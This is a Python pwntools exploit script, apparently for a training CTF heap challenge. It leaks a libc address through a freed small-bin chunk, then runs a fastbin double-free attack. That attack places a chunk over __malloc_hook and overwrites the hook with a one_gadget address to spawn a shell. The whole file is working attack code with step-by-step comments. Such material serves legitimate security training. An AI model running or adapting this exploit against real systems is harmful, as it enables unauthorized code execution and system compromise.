import time
from pwn import *
import sys


SIZE=90

if "REMOTE" not in args:
	r= process('./test')
else:
	r = remote("bin.training.jinblack.it", 10101)

def alloc0(size):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b"Size: ")
	r.sendline(b"%d" % size)
	r.recvuntil(b"index ")
	return int(r.recvuntil(b"!")[:-1])

def free0(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	return r.recvuntil(b"!")

def print0(index):
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	return r.recv_raw(6)

def write0(index,data):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Content: ")
	r.send(data)
	#r.recvuntil(b"Options: ")[:-len("Options:")]


input("start exploitation")
print(alloc0(200))
print(alloc0(10))
free0(0)	####small bin always points to glibc arena

leak=print0(0)

leak=leak+b'\x00\x00'

print(hex(u64(leak)))
libc=u64(leak)-0x3c4b78 ####arena offset to get libc base

malloc=libc+0x3c4b10    ####malloc hook offset
one=libc+0x45226        ####one trick gadget offset
#one=libc+0x4527a   BROKEN
#one=libc+0xf03a4   BROKEN
one=libc+0xf1247    #OK!

print("[!]LIBC: "+ hex(libc))
print("[!]MALLOC: "+ hex(malloc))
print("[!]ONE: "+ hex(one))

print(alloc0(200))  ##reallocate the freed to clean small bin list


##fast bin attack: two chunks, do the stuff
print("SIZE is: %d "%SIZE)
c1=alloc0(SIZE)
c2=alloc0(SIZE)
print(c1)
print(c2)

print(free0(c2))   #free list status:  head->c2->NULL
print(free0(c1))   # head->c1->c2->NULL
print(free0(c2))   # head->c2->c1->c2->NULL

t1=alloc0(SIZE)    # head->c1->c2->NULL (c2 is allocated)
print(t1)

payload=malloc-0x23
print("Overwriting with address: ")   ##LITERALLY WRITE IN C2
print(hex(payload))		      ##WHICH SHOULD CONTAIN POINTER
gdb.attach(r)
input("wait")
write0(t1,p64(payload))	              ##TO NEXT FREE CHUNK ;)
				      ##head->c1->c2->TARGET

print(alloc0(SIZE))		##head->c2->TARGET
print(alloc0(SIZE))		##head->TARGET
t1=alloc0(SIZE)		        ##ALLOCATED CHUNK AT TARGET ADDRESS,
				##WHICH IS ADDRESS OF MALLOC_HOOK
print("CHUNK ON MALLOC_HOOK:")
print(t1)

payload=b"A"*19+p64(one)
write0(t1,payload)              ##WRITE ADDRESS YOU WANT INSTEAD OF MALLOC
				##IN OUR CASE IS ONE TRICK GADGET

if "REMOTE" not in args:
	pid=gdb.attach(r)
	input("wait")


r.interactive()
